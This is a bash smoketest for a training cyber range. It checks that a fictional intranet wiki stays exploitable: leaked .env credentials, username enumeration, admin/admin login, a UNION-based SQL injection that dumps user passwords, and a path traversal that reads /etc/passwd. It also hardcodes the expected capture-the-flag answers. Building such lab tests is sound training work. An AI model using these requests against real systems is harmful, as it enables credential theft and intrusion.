#!/usr/bin/env bash
# A3 Intranet / Wiki smoketest.
#
# Runs every flag path + every design vulnerability from an attacker's
# perspective. Intended to be executed from inside the a14-kali container.
#
# Usage (from the range host):
#     docker cp smoketest.sh a14-kali:/tmp/a3-smoke.sh
#     docker exec a14-kali bash /tmp/a3-smoke.sh
#
# Exits 0 on full pass, 1 on any failure.

set -u

HOST="${A3_HOST:-intranet.boreas.local}"
COOKIES="$(mktemp)"
trap 'rm -f "$COOKIES"' EXIT

EXPECTED_FLAG_7="FLAG{4f2e8b7a1c6d9035}"
EXPECTED_FLAG_12="FLAG{d8a3c5e9f1b07264}"

FAIL=0
pass() { echo "  [PASS] $1"; }
fail() { echo "  [FAIL] $1"; FAIL=1; }
check_flag() {
    local label="$1" expected="$2" actual="$3"
    if [[ "$actual" == *"$expected"* ]]; then
        pass "$label = $expected"
    else
        fail "$label expected=$expected got='$actual'"
    fi
}

echo "A3 smoketest - target=$HOST"

echo
echo "--- Public pages ---"
code=$(curl -s -o /dev/null -w '%{http_code}' "http://$HOST/login")
[[ "$code" == "200" ]] && pass "/login returns 200" || fail "/login returned $code"
code=$(curl -s -o /dev/null -w '%{http_code}' "http://$HOST/status")
[[ "$code" == "200" ]] && pass "/status public (no auth required)" || fail "/status returned $code"

echo
echo "--- Flag 7: exposed /.env and /config.bak config leak ---"
env_body="$(curl -s "http://$HOST/.env")"
flag7="$(grep -oE 'FLAG\{[a-f0-9]+\}' <<<"$env_body" | head -1)"
check_flag "flag 7 via /.env" "$EXPECTED_FLAG_7" "$flag7"
grep -q 'ADMIN_PASSWORD' <<<"$env_body" && pass "/.env leaks ADMIN_PASSWORD" || fail "/.env missing ADMIN_PASSWORD"
grep -q 'DATABASE_URL' <<<"$env_body" && pass "/.env leaks DATABASE_URL" || fail "/.env missing DATABASE_URL"
grep -q 'RESEARCH_DB' <<<"$env_body" && pass "/.env leaks research DB creds (A8 breadcrumb)" || fail "/.env missing research DB creds"
cfgbak="$(curl -s "http://$HOST/config.bak")"
grep -q "$EXPECTED_FLAG_7" <<<"$cfgbak" && pass "/config.bak same flag" || fail "/config.bak missing flag"

echo
echo "--- Forgot password username enumeration ---"
f_unknown="$(curl -s -X POST "http://$HOST/forgot" -d "username=nosuchuser")"
f_known="$(curl -s -X POST "http://$HOST/forgot" -d "username=e.vasik")"
grep -q 'User not found' <<<"$f_unknown" && pass "unknown user -> 'User not found'" || fail "unknown response wrong"
grep -q 'Password reset link sent' <<<"$f_known" && pass "known user -> 'Password reset link sent'" || fail "known response wrong"

echo
echo "--- Login as admin/admin (from /.env disclosure) ---"
curl -s -c "$COOKIES" -o /dev/null "http://$HOST/login"
curl -s -c "$COOKIES" -b "$COOKIES" -L -X POST "http://$HOST/login" \
    -d "username=admin&password=admin" -o /dev/null
wiki="$(curl -s -b "$COOKIES" "http://$HOST/wiki")"
grep -q 'Welcome to the Boreas Systems Internal Wiki' <<<"$wiki" && pass "admin logged in; wiki home accessible" || fail "admin login or wiki home failed"

echo
echo "--- Flag 12: Project Coordination wiki page HTML comment ---"
proj="$(curl -s -b "$COOKIES" "http://$HOST/wiki/project-coordination")"
flag12="$(grep -oE 'FLAG\{[a-f0-9]+\}' <<<"$proj" | head -1)"
check_flag "flag 12" "$EXPECTED_FLAG_12" "$flag12"
grep -q 'Phase 3 integration' <<<"$proj" && pass "Project Coordination page mentions Phase 3 integration" || fail "Project Coordination content missing"
grep -q 'primary power source' <<<"$proj" || grep -q 'Primary power source' <<<"$proj" && pass "Project Coordination page mentions primary power source" || fail "missing power source text"

echo
echo "--- Wiki pages design spec ---"
for slug in hr-policies procurement it-kb project-coordination; do
    code=$(curl -s -o /dev/null -b "$COOKIES" -w '%{http_code}' "http://$HOST/wiki/$slug")
    [[ "$code" == "200" ]] && pass "/wiki/$slug reachable" || fail "/wiki/$slug returned $code"
done
it_kb="$(curl -s -b "$COOKIES" "http://$HOST/wiki/it-kb")"
grep -q 'dc01.boreas.local' <<<"$it_kb" && pass "IT KB lists dc01 hostname" || fail "IT KB missing dc01"
grep -q 'scada-gw.boreas.local' <<<"$it_kb" && pass "IT KB lists scada-gw hostname (A5 breadcrumb)" || fail "IT KB missing scada-gw"

echo
echo "--- Admin panel + LEVIATHAN draft ---"
admin_body="$(curl -s -b "$COOKIES" "http://$HOST/admin")"
grep -q 'Admin Panel' <<<"$admin_body" && pass "/admin accessible as admin role" || fail "/admin inaccessible"
grep -q 'leviathan' <<<"$admin_body" && pass "LEVIATHAN draft listed in admin panel" || fail "LEVIATHAN draft missing"
lev="$(curl -s -b "$COOKIES" "http://$HOST/admin/page/leviathan-schedule")"
grep -q 'MOVED TO SECURE' <<<"$lev" && pass "LEVIATHAN body = [MOVED TO SECURE SYSTEM]" || fail "LEVIATHAN body wrong"

echo
echo "--- SQL injection in /search dumps user table ---"
payload="' UNION SELECT username, password, fullname FROM users--"
injected="$(curl -s -b "$COOKIES" -X POST "http://$HOST/search" \
    --data-urlencode "q=$payload")"
dumped=0
for pw in Password1 Welcome1 Summer2024 'Reactor#Core9' 'Boreas2025!' 'Br3ach!ng' 'P@ssw0rd123'; do
    grep -qF "$pw" <<<"$injected" && dumped=$((dumped + 1))
done
(( dumped >= 5 )) && pass "SQLi dumped at least 5 user passwords from users table (got $dumped)" \
    || fail "SQLi returned only $dumped password matches"

echo
echo "--- Directory traversal in /download (from fixed /var/www/docs base) ---"
legit="$(curl -s -b "$COOKIES" "http://$HOST/download?file=README.txt")"
grep -q 'Boreas Systems internal document archive' <<<"$legit" && pass "legit /download?file=README.txt serves base-dir file" || fail "legit download broken"
passwd_leak="$(curl -s -b "$COOKIES" "http://$HOST/download?file=../../../etc/passwd")"
grep -q 'root:.*:/root:' <<<"$passwd_leak" && pass "path traversal reads /etc/passwd" || fail "path traversal failed"

echo
if (( FAIL == 0 )); then
    echo "A3 smoketest: PASS"
    exit 0
else
    echo "A3 smoketest: FAIL ($FAIL failure(s))"
    exit 1
fi
